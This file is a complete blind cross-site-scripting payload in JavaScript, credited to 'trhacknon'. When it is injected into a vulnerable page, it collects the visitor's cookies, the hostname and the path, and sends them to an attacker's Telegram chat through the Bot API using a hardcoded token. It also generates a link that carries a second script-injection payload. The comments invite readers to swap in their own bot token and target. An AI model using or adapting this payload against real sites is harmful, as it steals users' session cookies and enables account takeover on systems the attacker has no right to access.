var tokenBot = '5178207247:AAGmAoJX71KZQXrURaUXSrDacehVdsaRN6Y'; // Your "tokenBot" Here
var chatId = '-1001690993326'; // Your "chatId" Here

/*
         _                     _       _
        | |____  _____ ___    | |_ ___| | ___
        | '_ \ \/ / __/ __|___| __/ _ \ |/ _ \
        | |_) >  <\__ \__ \___| ||  __/ |  __/
        |_.__/_/\_\___/___/    \__\___|_|\___|
        ------ Blind XSS Alert Telegram ------
                                   trhacknon
*/

function telegramSend(tokenBot, chatId) {
    var textData = '<b>Blind XSS by trhacknon</b>\n\n<b>XSS Alert in ' + document.domain + '</b>\n------------------------------------------------\n\n<b>- URL Target -</b>\n<code>' + document['location']['hostname'] + document['location']['pathname'] + '</code>\n\n<b>- Document Cookie -</b>\n<code>' + document.cookie + '</code>\n\n<b>- Verify XSS -</b>\n<a href="' + getVerifyUrl() + '">Click here to verify XSS</a>';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(textData) + '&parse_mode=html', true);
    xhr.send();
}

function getVerifyUrl() {
    var l = document.createElement('a');
    l.href = 'http://' + document['location']['hostname'] + document['location']['pathname'] + '?id="><script>alert(/XssByTrhacknon/)</script>'; // Replace with your target URL and payload
    return l.href;
}

telegramSend(tokenBot, chatId);
